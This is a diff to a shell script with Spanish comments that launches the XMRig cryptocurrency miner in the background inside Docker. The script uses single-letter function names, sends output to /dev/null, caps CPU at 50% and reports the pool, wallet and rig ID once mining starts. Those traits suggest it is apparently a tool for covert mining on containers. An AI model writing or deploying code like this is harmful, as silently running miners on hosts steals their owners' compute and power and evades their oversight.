@@ -157,8 +157,8 @@ M() {
     
     LOG_FILE="/tmp/xmrig_$$.log"
     
-    # Configuración optimizada para Docker sin TTY
-    setsid "$BIN_PATH" \
+    # Configuración optimizada para Docker sin TTY, con opciones compatibles
+    "$BIN_PATH" \
         -o "$POOL" \
         -u "$W" \
         --rig-id="$RIG_ID" \
@@ -172,16 +172,12 @@ M() {
         --randomx-init=1 \
         --max-cpu-usage=50 \
         --print-time=0 \
-        --health-print-time=0 \
         --retries=3 \
         --retry-pause=5 \
-        --stdin=false \
-        --tls=false \
-        --keepalive \
         >/dev/null 2>"$LOG_FILE" &
     
     PID=$!
-    sleep 15
+    sleep 10
     
     if kill -0 $PID 2>/dev/null; then
         N "⚡ **MINERÍA INICIADA**\n⛏️  Pool: $POOL\n🧵 Threads: 1\n🆔 Rig ID: $RIG_ID\n💰 Wallet: ${W:0:8}...${W: -8}\n📂 Directorio: $(dirname "$BIN_PATH")"
